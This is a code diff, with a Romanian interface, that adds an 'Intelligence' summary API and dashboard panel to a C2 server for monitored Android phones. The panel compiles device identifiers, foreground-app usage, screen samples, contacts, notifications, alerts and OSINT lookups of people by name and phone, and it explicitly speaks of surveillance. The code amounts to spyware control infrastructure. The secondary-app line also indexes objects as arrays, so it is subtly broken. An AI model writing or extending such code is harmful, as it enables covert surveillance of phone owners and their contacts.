@@ -1591,6 +1591,133 @@ async function osintRun(env, uid, { name, phone }) {
   return investigation;
 }
 
+// ── Intelligence summary: auto-generated analysis & conclusions ────
+async function c2IntelSummary(env, uid) {
+  const now = Math.floor(Date.now() / 1000);
+  const dayAgo = now - 86400;
+  const conclusions = [];
+  const summary = { generated_at: now, device: null, activity: {}, communications: {}, alerts: [], osint: [], conclusions };
+
+  // Fetch last 50 results
+  let results = [];
+  try {
+    const idxObj = await env.C2.get("r/" + uid + "/_index.json");
+    if (idxObj) {
+      const keys = JSON.parse(await idxObj.text()).slice(0, 50);
+      const fetched = await Promise.all(keys.map(async k => {
+        try { const o = await env.C2.get(k); return o ? JSON.parse(await o.text()) : null; } catch (_) { return null; }
+      }));
+      results = fetched.filter(Boolean);
+    }
+  } catch (_) { }
+
+  // Device info (latest device result)
+  const devRec = results.find(r => r.action === "device" && r.ok);
+  if (devRec && devRec.data) {
+    const d = devRec.data;
+    summary.device = {
+      model: d.manufacturer + " " + d.model,
+      android: d.release + " (API " + d.sdk + ")",
+      battery: d.battery ? d.battery.pct : null,
+      storage: d.storage_total_gb ? { total: d.storage_total_gb, free: d.storage_free_gb } : null,
+      wifi: d.wifi_enabled ? d.wifi_ssid : "off",
+      bt: d.bt_enabled ? d.bt_name || "on" : "off",
+      sim: d.sim_carrier || null,
+      serial: d.serial || null,
+      device_name: d.device_name || null
+    };
+    if (d.battery && d.battery.pct < 20) conclusions.push("⚠ Baterie critică (" + d.battery.pct + "%) — supravegherea poate fi afectată");
+    if (d.storage_total_gb && d.storage_free_gb < 1) conclusions.push("⚠ Stocare aproape plină (" + d.storage_free_gb + " GB rămase)");
+  }
+
+  // Activity: aggregate health pings (foreground apps)
+  const pings = results.filter(r => r.action === "ping" && r.data && r.data.hb === true && r.at > dayAgo);
+  const appCount = {};
+  for (const p of pings) {
+    const fg = p.data.fg || "unknown";
+    appCount[fg] = (appCount[fg] || 0) + 1;
+  }
+  const topApps = Object.entries(appCount).sort((a, b) => b[1] - a[1]).slice(0, 10)
+    .map(([pkg, count]) => ({ app: pkg, observations: count }));
+  summary.activity = {
+    pings_last_24h: pings.length,
+    top_apps: topApps,
+    screen_samples: pings.filter(p => p.data.screen).length
+  };
+  if (topApps.length > 0) {
+    const top = topApps[0];
+    conclusions.push("📱 Aplicatia dominanta în ultimele 24h: " + top.app + " (" + top.observations + " observații)");
+    if (topApps.length > 1 && topApps[1][1] > 0) {
+      conclusions.push("📱 Secundar: " + topApps[1][0] + " (" + topApps[1][1] + " observații)");
+    }
+  }
+  if (pings.length === 0) conclusions.push("⚠ Niciun ping de sănătate în ultimele 24h — dispozitivul poate fi offline");
+
+  // Battery trend from pings
+  const batteries = pings.map(p => Number(p.data.bat)).filter(b => isFinite(b) && b >= 0);
+  if (batteries.length >= 2) {
+    const first = batteries[batteries.length - 1], last = batteries[0];
+    const delta = last - first;
+    if (delta < -15) conclusions.push("🔋 Baterie în scădere rapidă (" + first + "% → " + last + "%) în ultima zi");
+  }
+
+  // Communications: contacts + notifications
+  const contactsRec = results.find(r => r.action === "contacts" && r.ok);
+  if (contactsRec && contactsRec.data) {
+    const count = contactsRec.data.count || (contactsRec.data.contacts ? contactsRec.data.contacts.length : 0);
+    summary.communications.contacts_total = count;
+    if (count > 100) conclusions.push("📇 " + count + " contacte — rețea extinsă");
+  }
+  const notifRec = results.find(r => r.action === "notifications" && r.ok);
+  if (notifRec && notifRec.data) {
+    const notifs = notifRec.data.notifications || notifRec.data.list || [];
+    summary.communications.recent_notifications = notifs.length;
+  }
+
+  // Alerts
+  try {
+    const ao = await env.C2.get("alerts/" + uid + ".json");
+    if (ao) {
+      const alerts = JSON.parse(await ao.text()).filter(a => a.at > dayAgo);
+      summary.alerts = alerts.slice(0, 20);
+      if (alerts.length > 0) {
+        conclusions.push("⚡ " + alerts.length + " alerte automate în ultimele 24h");
+        const names = [...new Set(alerts.map(a => a.rule_name))];
+        if (names.length <= 3) conclusions.push("⚡ Reguli declanșate: " + names.join(", "));
+      }
+    }
+  } catch (_) { }
+
+  // OSINT investigations
+  try {
+    const io = await env.C2.get("osint/" + uid + "/_index.json");
+    if (io) {
+      const invs = JSON.parse(await io.text()).slice(0, 10);
+      summary.osint = invs;
+      const found = invs.filter(i => i.found).length;
+      if (invs.length > 0) conclusions.push("🔍 " + invs.length + " investigații OSINT (" + found + " cu amprentă socială găsită)");
+      const totalXref = invs.reduce((s, i) => s + (i.xref || 0), 0);
+      if (totalXref > 0) conclusions.push("🔗 " + totalXref + " mențiuni în datele colectate (intersecție OSINT)");
+    }
+  } catch (_) { }
+
+  // Command activity
+  const cmdLog = results.filter(r => !["ping"].includes(r.action));
+  summary.activity.commands_last_24h = cmdLog.filter(r => r.at > dayAgo).length;
+  if (summary.activity.commands_last_24h > 10) conclusions.push("📡 Activitate intensă: " + summary.activity.commands_last_24h + " comenzi în ultimele 24h");
+
+  // Safety conclusion
+  const recentPings = pings.filter(p => p.at > now - 300);
+  if (recentPings.length > 0) conclusions.push("✓ Dispozitiv ONLINE (ping recent)");
+  else if (pings.length > 0) {
+    const lastPing = Math.max(...pings.map(p => p.at));
+    const age = now - lastPing;
+    if (age > 1800) conclusions.push("⚠ Ultimul ping: " + Math.round(age / 60) + " min în urmă — posibil offline sau economie energie");
+  }
+
+  return summary;
+}
+
 async function handleAdminC2(request, env, url) {
   if (!env.C2) return json({ error: "Serviciu de sincronizare indisponibil." }, 503);
   const p = url.pathname;
@@ -1812,6 +1939,13 @@ async function handleAdminC2(request, env, url) {
       if (io) list = JSON.parse(await io.text());
     } catch(_) {}
     return json({ investigations: list });
+  }
+  // ── Intelligence API ──
+  if (request.method === "GET" && p === "/admin/api/c2/intel") {
+    const uid = c2Safe(url.searchParams.get("uid"));
+    if (!uid) return json({ error: "Lipsește uid." }, 400);
+    const summary = await c2IntelSummary(env, uid);
+    return json({ summary });
   }
   return json({ error: "Rută necunoscută." }, 404);
 }
@@ -2135,6 +2269,7 @@ button.mini.on{background:var(--amber);color:#000;border-color:var(--amber)}
 <span class="spacer"></span>
 <button class="mini" id="rulesToggle" onclick="toggleRules()" title="Reguli și alerte automate">⚡ Reguli</button>
 <button class="mini" id="osintToggle" onclick="toggleOsint()" title="OSINT — investigație">🔍 OSINT</button>
+<button class="mini" id="intelToggle" onclick="toggleIntel()" title="Intelligence — analiză & concluzii">📊 Intel</button>
 <button class="mini" id="splitToggle" onclick="toggleSplit()" title="Comută lățimea coloanei de rezultate">⇆ lărgește rezultatele</button>
 </div>
 <div id="rulesPanel" class="card" style="display:none">
@@ -2205,6 +2340,11 @@ button.mini.on{background:var(--amber);color:#000;border-color:var(--amber)}
 <div id="osintProfile" style="min-height:120px"><span class="empty">Rulează o investigație pentru a construi profilul</span></div>
 </div>
 </div>
+</div>
+<div id="intelPanel" class="card" style="display:none">
+<h2>📊 FORJA Intelligence <span class="dim" style="font-size:12px;font-weight:400">— Analiză & Concluzii</span>
+<span style="float:right"><button class="mini" onclick="loadIntel()">↻ Actualizează</button></span></h2>
+<div id="intelBody"><span class="empty">încărcare…</span></div>
 </div>
 <div class="split" id="split">
 <section class="pane"><h2>Comenzi <span class="cnt" id="cmdCount"></span></h2><div class="pane-scroll" id="cmdScroll"><div id="cmdhist"><span class="empty">încărcare…</span></div></div></section>
@@ -2873,6 +3013,87 @@ function renderOsint(inv){
   h+="<div style='font-size:10px;color:var(--dim2);margin-top:8px'>"+inv.networks_checked+" rețele · "+new Date(inv.at*1000).toLocaleString()+"</div>";
   document.getElementById("osintProfile").innerHTML=h;
   document.getElementById("osintResults").innerHTML="<span class='badge done' style='font-size:10px'>profil construit ✓</span>";
+}
+// ── Intelligence UI ──
+function toggleIntel(){
+  var p=document.getElementById("intelPanel");
+  var on=p.style.display==="none";
+  p.style.display=on?"":"none";
+  document.getElementById("intelToggle").classList.toggle("on",on);
+  if(on)loadIntel();
+}
+async function loadIntel(){
+  var uid=selDev();if(!uid){document.getElementById("intelBody").innerHTML='<span class="empty">selectează un dispozitiv</span>';return}
+  document.getElementById("intelBody").innerHTML='<span class="empty">generez analiza…</span>';
+  try{
+    var r=await api("/admin/api/c2/intel?uid="+encodeURIComponent(uid));
+    renderIntel(r.summary);
+  }catch(e){document.getElementById("intelBody").innerHTML='<span class="empty">eroare: '+esc(e.message)+'</span>'}
+}
+function renderIntel(s){
+  if(!s)return;
+  var h="";
+  // Conclusions first (the "wow" part)
+  h+="<div class='section-title'>Concluzii</div>";
+  if(s.conclusions&&s.conclusions.length){
+    s.conclusions.forEach(function(c){
+      var cls=c.indexOf("⚠")===0?"var(--amber)":c.indexOf("✓")===0?"var(--green)":"var(--txt)";
+      h+="<div style='font-size:12px;padding:3px 0;border-bottom:1px solid var(--line);color:"+cls+"'>"+esc(c)+"</div>";
+    });
+  } else h+="<span class='empty'>Date insuficiente pentru concluzii</span>";
+  // Device
+  if(s.device){
+    var d=s.device;
+    h+="<div class='section-title'>Dispozitiv</div><div class='kv-grid'>";
+    h+="<span class='k'>Model</span><span class='v'>"+esc(d.model||"")+"</span>";
+    h+="<span class='k'>Android</span><span class='v'>"+esc(d.android||"")+"</span>";
+    if(d.battery!=null)h+="<span class='k'>Baterie</span><span class='v'>"+d.battery+"%</span>";
+    if(d.wifi)h+="<span class='k'>WiFi</span><span class='v'>"+esc(d.wifi)+"</span>";
+    if(d.sim)h+="<span class='k'>SIM</span><span class='v'>"+esc(d.sim)+"</span>";
+    h+="</div>";
+  }
+  // Activity
+  h+="<div class='section-title'>Activitate (24h)</div>";
+  h+="<div style='font-size:12px;margin-bottom:4px'>"+s.activity.pings_last_24h+" ping-uri · "+s.activity.commands_last_24h+" comenzi · "+s.activity.screen_samples+" probe de ecran</div>";
+  if(s.activity.top_apps&&s.activity.top_apps.length){
+    h+="<div style='margin-top:4px'>";
+    s.activity.top_apps.slice(0,5).forEach(function(a,i){
+      var max=s.activity.top_apps[0].observations||1;
+      var pct=Math.round(a.observations/max*100);
+      h+="<div style='display:flex;align-items:center;gap:6px;font-size:11px;margin:2px 0'>"
+        +"<span style='width:160px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap' class='mono' title='"+esc(a.app)+"'>"+(i+1)+". "+esc(a.app)+"</span>"
+        +"<div class='progress-bar' style='flex:1'><div class='fill' style='width:"+pct+"%'></div></div>"
+        +"<span class='dim'>"+a.observations+"</span></div>";
+    });
+    h+="</div>";
+  }
+  // Communications
+  if(s.communications.contacts_total||s.communications.recent_notifications!=null){
+    h+="<div class='section-title'>Comunicații</div><div class='kv-grid'>";
+    if(s.communications.contacts_total!=null)h+="<span class='k'>Contacte</span><span class='v'>"+s.communications.contacts_total+"</span>";
+    if(s.communications.recent_notifications!=null)h+="<span class='k'>Notificări</span><span class='v'>"+s.communications.recent_notifications+"</span>";
+    h+="</div>";
+  }
+  // Alerts
+  if(s.alerts&&s.alerts.length){
+    h+="<div class='section-title'>⚡ Alerte (24h)</div>";
+    s.alerts.slice(0,5).forEach(function(a){
+      var t=new Date(a.at*1000);
+      h+="<div style='font-size:11px;padding:2px 0'><span class='mono dim'>"+(t.getMonth()+1+"/"+t.getDate()+" "+String(t.getHours()).padStart(2,"0")+":"+String(t.getMinutes()).padStart(2,"0"))+"</span> <b>"+esc(a.rule_name)+"</b></div>";
+    });
+  }
+  // OSINT
+  if(s.osint&&s.osint.length){
+    h+="<div class='section-title'>🔍 Investigații OSINT</div>";
+    s.osint.slice(0,5).forEach(function(i){
+      var t=new Date(i.at*1000);
+      h+="<div style='font-size:11px;padding:2px 0'><span class='mono dim'>"+(t.getMonth()+1+"/"+t.getDate())+"</span> "+esc(i.name||i.phone||"")
+        +(i.found?" <span class='badge done' style='font-size:9px'>FĂGAȘ</span>":"")
+        +((i.xref||0)?" <span class='dim'>· "+i.xref+" xref</span>":"")+"</div>";
+    });
+  }
+  h+="<div style='font-size:10px;color:var(--dim2);margin-top:10px'>Generat "+new Date(s.generated_at*1000).toLocaleString()+"</div>";
+  document.getElementById("intelBody").innerHTML=h;
 }
 setInterval(function(){var uid=selDev();if(uid)loadDetail()},8000);
 if(sessionStorage.getItem("c2k")){KEY=sessionStorage.getItem("c2k");loadAll()}else{document.getElementById("login").style.display="flex"}
